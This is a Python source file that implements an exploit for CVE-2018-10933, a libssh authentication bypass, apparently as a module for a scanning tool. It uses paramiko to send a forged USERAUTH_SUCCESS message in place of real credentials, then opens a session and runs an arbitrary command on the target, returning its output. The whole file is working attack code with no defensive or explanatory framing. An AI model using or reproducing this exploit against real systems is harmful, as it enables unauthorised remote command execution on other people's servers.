#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import sys
import paramiko
import socket
import logging
#
# logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048

class Cve_2018_10933:
    def __init__(self):
        self.header = None
        self.proxy = None

    def execute(self,hostname, port, command):
        sock = socket.socket()
        try:
            sock.connect((hostname, int(port)))

            message = paramiko.message.Message()
            transport = paramiko.transport.Transport(sock)
            transport.start_client()

            message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
            transport._send_message(message)

            client = transport.open_session(timeout=10)
            client.exec_command(command)

            # stdin = client.makefile("wb", bufsize)
            stdout = client.makefile("rb", bufsize)
            stderr = client.makefile_stderr("rb", bufsize)

            output = stdout.read()
            error = stderr.read()

            stdout.close()
            stderr.close()

            return (output + error).decode()
        except paramiko.SSHException as e:
            logging.exception(e)
            logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
        except socket.error:
            logging.debug("Unable to connect.")

        return None

    def main(self,target):
        url = target["url"].strip('/ ')
        prot = target["port"]
        cmd = target
        # _,self.proxy = reqset["proxy"]
        self.execute(url,prot,cmd)
